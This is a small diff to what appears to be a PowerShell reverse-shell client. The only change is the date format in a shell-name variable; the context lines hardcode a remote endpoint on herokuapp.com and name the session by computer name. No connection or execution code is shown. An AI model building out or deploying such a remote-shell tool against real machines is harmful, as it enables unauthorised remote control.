@@ -2,7 +2,7 @@
 # License http://opensource.org/licenses/mit-license.php MIT License
 
 $__url = "https://reverse80.herokuapp.com/"
-$__shell_name = $env:computername + "  " + (Get-Date -Format g)
+$__shell_name = $env:computername + "  " + (Get-Date -Format G)
 
 try
 {
